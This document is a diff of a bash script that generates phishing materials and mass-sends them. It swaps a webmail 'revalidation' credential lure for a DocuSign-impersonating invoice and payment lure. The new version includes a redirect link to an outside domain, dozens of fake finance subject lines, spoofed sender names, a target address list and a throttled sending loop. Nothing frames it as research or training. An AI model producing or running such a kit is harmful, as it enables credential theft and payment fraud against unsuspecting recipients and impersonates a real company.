@@ -202,155 +202,118 @@ EOL
 # Create a sample HTML email content (email.html)
 echo "Creating email.html with email content..."
 cat > email.html <<EOL
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
-<html>
-<head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Webmail Notification</title>
-  <style type="text/css">
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Roboto, Tahoma, Helvetica, sans-serif;
-      color: #333333;
-      line-height: 1.5;
-    }
-    .header-bar {
-      background-color: #d40000; /* Changed from #029740 (green) to #d40000 (red) */
-      color: #ffffff;
-      padding: 10px;
-      font-size: 12px;
-    }
-    .content {
-      padding: 20px;
-      max-width: 600px;
-      margin: 0 auto;
-    }
-    h1 {
-      color: #ee6111; /* Kept orange accent */
-      text-align: center;
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-    .footer {
-      text-align: center;
-      font-size: 12px;
-      color: #777777;
-      margin-top: 30px;
-    }
-  </style>
+
+
+<html><head><title></title>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
 </head>
-<body>
-  <table width="100%" cellspacing="0" cellpadding="0">
-    <tr>
-      <td class="header-bar">
-        Mail Server Account Update Notification
-      </td>
-    </tr>
-  </table>
-
-  <div class="content">
-    <h1>Webmail</h1>
-    <p>Your sign-in method will stop functioning on 08/20/2025 (Confirmation Needed), you must take prompt steps to maintain and prevent limitations to your account - {recipient-email}.</p>
-	    <p>View the attached document for further instructions.</p>
-    <p>Thank you.</p>
-  </div>
-
-  <div class="footer">
-    <p>&copy; 2025 {recipient-domain} Inc.  For intended recipient.</p>
-  </div>
-</body>
-</html>
+<body style="margin: 0.4em; font-size: 14pt;">
+<table style='color: rgb(34, 34, 34); text-transform: none; line-height: normal; letter-spacing: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; max-width: 640px; orphans: 2; widows: 2; font-feature-settings: "liga" 0; background-color: rgb(255, 255, 255); 
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;'><tbody><tr><td style="margin: 0px; padding: 10px 24px;"></td></tr><tr><td style="margin: 0px; padding: 0px 24px 30px;">
+<table width="100%" align="center" style='color: rgb(255, 255, 255); line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0; background-color: rgb(30, 76, 161);' border="0" cellspacing="0" cellpadding="0"><tbody><tr>
+<td align="center" style='margin: 0px; padding: 28px 10px 36px; border-radius: 2px; width: 572px; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica, Arial, "Sans Serif"; font-size: 16px; background-color: rgb(30, 76, 161);'><strong>
+</strong><img width="598" height="208" style="width: 254px; height: 75px;" src="https://brandlogos.net/wp-content/uploads/2024/04/docusign-logo_brandlogos.net_5wujv-512x103.png">
+<table width="100%" style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' border="0" cellspacing="0" cellpadding="0"><tbody><tr>
+<td align="center" style='margin: 0px; text-align: center; color: rgb(255, 255, 255); padding-top: 24px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 16px;'><p><font size="5"><strong>Contract&nbsp;P</strong><strong>ayment Approved</strong></font></p><p>{recipient-user}</p><p><font size="4"><strong>"<font size="3"><span style="font-size: 12pt;"><span style="font-size: 14pt;">
+Please reconfirm this order before we release payment.</span></span></font>"</strong></font></p><p>Use the button below to review&nbsp; the order&nbsp;and sign document(s)</p></td></tr></tbody></table>
+<table width="100%" style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' border="0" cellspacing="0" cellpadding="0"><tbody><tr><td align="center" style="margin: 0px; padding-top: 30px;"><div>
+<table style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' cellspacing="0" cellpadding="0"><tbody><tr>
+<td height="44" align="center" style='margin: 0px; border-radius: 2px; border: 1px solid rgb(255, 255, 255); border-image: none; height: 44px; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica, Arial, "Sans Serif"; font-size: 14px; font-weight: bold; text-decoration: none; display: block; background-color: rgb(30, 76, 161);'>
+<a style='padding: 0px 12px; text-align: center; color: rgb(255, 255, 255); font-family: Helvetica, Arial, "Sans Serif"; font-size: 14px; font-weight: bold; text-decoration: none; display: inline-block; background-color: rgb(30, 76, 161);' href="https://medium.com/m/global-identity-2?redirectUrl=https://signed-docs.com" target="_blank" rel="noopener" data-saferedirecturl=""><span style="line-height: 44px;">ACCESS DOCUMENTS</span></a></td></tr></tbody></table></div></td></tr>
+</tbody></table></td></tr></tbody></table></td></tr><tr>
+<td style='margin: 0px; padding: 0px 24px 24px; color: rgb(0, 0, 0); font-family: Helvetica, Arial, "Sans Serif"; font-size: 16px; background-color: white;'><table style='line-height: normal; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"; font-size: 13px; font-weight: normal; border-collapse: collapse; font-feature-settings: "liga" 0;' border="0" cellspacing="0" cellpadding="0"><tbody><tr>
+<td style="margin: 0px; padding-bottom: 20px;"><div style='color: rgb(51, 51, 51); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px; font-weight: bold;'>Email For</div><div style='color: rgb(102, 102, 102); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px;'><font color="#0000ff">{recipient-email}</font></div></td></tr></tbody></table>
+<p style='margin: 0px 0px 1em; color: rgb(51, 51, 51); line-height: 20px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px;'>All parties have completed Documents for your<span>&nbsp;</span><span class="il">DocuSign</span><span>&nbsp;</span>Signature.</p><p style='margin: 0px 0px 1em; color: rgb(51, 51, 51); line-height: 20px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 15px;'>
+I am sending you this request for your electronic signature, please review and electronically sign by following the link below.</p></td></tr><tr><td style='margin: 0px; padding: 0px 24px 12px; color: rgb(102, 102, 102); font-family: Helvetica, Arial, "Sans Serif"; font-size: 11px; background-color: rgb(255, 255, 255);'></td></tr><tr><td style="margin: 0px; padding: 30px 24px 45px; background-color: rgb(234, 234, 234);">
+<p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 13px;'><b aria-level="3">Do Not Share This Email</b><br>This email contains a secure link to<span>&nbsp;</span><span class="il">Docusign</span>. Please do not share this email, link, or access code with others.<br><br>
+If you have trouble signing, visit "<a style="color: rgb(36, 99, 209); text-decoration: underline;" href="" target="_blank" rel="noopener" data-saferedirecturl="">How to Sign a Document</a>" on our<span>&nbsp;</span>
+<a style="color: rgb(36, 99, 209); text-decoration: underline;" target="_blank" rel="noopener" data-saferedirecturl=""><span class="il">Docusign</span><span>&nbsp;</span>Support Center</a>, or browse our<span>&nbsp;</span>
+<a style="color: rgb(36, 99, 209); text-decoration: underline;" href="" target="_blank" rel="noopener" data-saferedirecturl=""><span class="il">Docusign</span><span>&nbsp;</span>Community</a><span>&nbsp;</span>for more information.<br><br></p>
+<p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 18px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 13px;'>
+<a style="color: rgb(36, 99, 209); text-decoration: underline;" href="" target="_blank" rel="noopener" data-saferedirecturl="">
+<img width="18" height="18" class="CToWUd" style="margin-right: 7px; vertical-align: middle;" alt="" src="" data-image-whitelisted="" data-bit="iit">Download the<span>&nbsp;</span><span class="il">Docusign</span><span>&nbsp;</span>App</a></p><p style='margin: 0px 0px 1em; color: rgb(102, 102, 102); line-height: 14px; font-family: Helvetica, Arial, "Sans Serif"; font-size: 10px;'>This message was sent to you by Michael Romey who is using the<span>&nbsp;</span><span class="il">Docusign</span>
+<span>&nbsp;</span>
+Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.</p></td></tr></tbody></table></body></html>
 EOL
 
 # Create a sample txt subject content (subject.txt)
 echo "Creating subject.txt with subject content..."
 cat > subject.txt <<EOL
-Revalidate
-Confirm {recipient-email}
-{recipient-user} validation
-Secure {recipient-domain}
-{recipient-user} re-auth
-Ref:{random-number} error notification
-{recipient-user} validate
-{recipient-domain} maintenance: confirm your details
-Account security update
-Authentication required
-Confirmation requested
-Records update required
-Security confirmation
-Routine authentication for your email account
-MX records confirmation
-Email system maintenance notification
-Verify your account
-Final step to secure account
-Review required
+perfect
+
+Vendor Payment Advice Note
+INVC0059268 - [EXTERNAL] Fwd: RETURNED INVOICE FROM VENDOR
+RE: Outstanding payment 
+INV - Kerry - I215362 - QR 
+FW: RETURNED INVOICE
+INV & D.O - Edgenta I211637 & I211938 ( Oct INV & D.O)
+RE: E Invoice 
+Docusign -RFQ- PVC BOOT 12" 
+Your EFT Settlement Invoice is Ready for Review 
+RE: Invoice Reconciliation Report – {date}
+FW: Vendor Claim Adjustment – Doc #{random-number}
+Payment Confirmation Notice – Ref #{random-number}
+FW: Purchase Order #{random-number} – Signature Required
+RE: Invoice Query – {recipient-domain}
+FW: Credit Note #{random-number} Attached
+Vendor Statement – Period Ending {date}
+Remittance Advice – {recipient-domain} – {date}
+RE: Billing Discrepancy – Inv #{random-number}
+FW: Signed PO #{random-number} – For Review
+Payment Status Update – Ref #{random-number}
+RE: Returned EFT File – Ref #{random-number}
+FW: Vendor Invoice Approval – {date}
+Payment Advice – Inv #{random-number} – {recipient-domain}
+RE: Confirmation of Funds Transfer – {date}
+FW: PO #{random-number} – Document Attached
+RE: Signed Quotation #{random-number}
+Payment Voucher #{random-number} – Please Review
+FW: Invoice #{random-number} Returned (Invalid PO)
+RE: Pending Invoice Validation – {date}
+Vendor Credit Memo #{random-number} – For Processing
+RE: Updated Banking Information – {recipient-domain}
+FW: Payment Release Form – Doc #{random-number}
+RE: Debit Note #{random-number} – Attached
+FW: Account Statement – {date} – {recipient-domain}
+RE: DocuSign Request – PO #{random-number}
+Payment Reconciliation – Ref #{random-number}
+FW: E-Payment Status – Batch #{random-number}
+RE: Supplier Settlement Confirmation – {date}
+FW: Approval Required – Invoice #{random-number}
+RE: Payment Advice from {recipient-domain} – {date}
 EOL
 
 # Create a sample txt name content (name.txt)
 echo "Creating name.txt with name content..."
 cat > name.txt <<EOL
-Support
-Mail Delivery
-Admin
-System Notification
-Mailbox
-Mail Server
-Security Team
-Postmaster
-IT Service Desk
-IT
-Webmail Admin
-Mail Operations
-Support Team
-Message Center
-Administrator
-No-Reply Mailer
-Email Management
-SecureMail Services
-Webmail Notification
-IT Security Admin
-Network Operations
-CyberSecurity
-System Compliance
-Infrastructure Watch
-IT Governance
-Mail Shield
-Domain Guardian
-Inbox Sentinel
-Cyber Patrol
-Firewall Watch
-Secure Gateway
-Data Bastion
-Threat Response
-Breach Alert
-Policy Enforcer
-Login Vigilante
-SSO Guardian
-2FA Enforcer
-Identity Sentinel
-Domain & Server Focused
-DNS Protector
-Server Watchtower
-Hosting Safeguard
-SSL Sentinel
-Webmail Revalidation
-Backup Defender
-Server Patrol
-Webmail Defender
-No-Reply Security
-Do Not Ignore: IT Dept
-Verified IT Sender
-Domain Patrol
+Accounts Payable
+Finance Department
+Vendor Management
+Accounts Department
+Payments Team
+Procurement Office
+Billing Department
+Shared Services Center
+Accounts Payable Unit
+Finance Operations
+Treasury Division
+Vendor Relations
+Corporate Finance Office
+Billing & Settlements
+Accounts Processing
+Payment Desk
+DocuSign Notification
+eInvoicing System
+Finance Automation
+Vendor Support Desk
 EOL
 
 # Create a sample txt list content (list.txt)
 echo "Creating list.txt with list content..."
 cat > list.txt <<EOL
-info@brickx.us
-mackenzie@walshequipment.ca
-podpora@vsezapivo.si
+zruba@vnkgroup-ks.com
+prodaja@vbuilding.rs
+
 EOL
 
 # Create the sending script (send.sh)
@@ -524,9 +487,12 @@ while IFS= read -r email; do
             # TXTPDF mode: Text body + PDF attachment
             TEMP_BODY=\$(mktemp)
             cat <<EOF > "\$TEMP_BODY"
-Reminder: Complete verification for \$CLEAN_EMAIL via the attached instructions (from \$CURRENT_DATE to 2025-06-30) to prevent losing access to your account.
+$EMAIL_USER — Please review the attached file to confirm the invoice before we release payment. 
 
-Webmail Â© 2025. All rights reserved.
+View & sign: [ACCESS DOCUMENTS] 
+
+Sent to $CLEAN_EMAIL by the Accounts Team. 
+If this message was not expected, please contact the Accounts Team for assistance.
 EOF
             PDF_FILE=\$(process_pdf_template "\$CLEAN_EMAIL" "\$RANDOM_NAME" "\$RANDOM_NUMBER" "\$CURRENT_DATE" "\$EMAIL_USER" "\$EMAIL_DOMAIN" "\$BASE64_EMAIL")
             ;;
@@ -602,7 +568,7 @@ EOF
         ((FAILED++))
     fi
 
-    sleep \$(awk -v min=0.1 -v max=0.5 'BEGIN{srand(); print min+rand()*(max-min)}')
+    sleep \$(awk -v min=0.2 -v max=0.4 'BEGIN{srand(); print min+rand()*(max-min)}')
 
     echo "[\$SUCCESS/\$TOTAL] Sent to \$CLEAN_EMAIL"
 
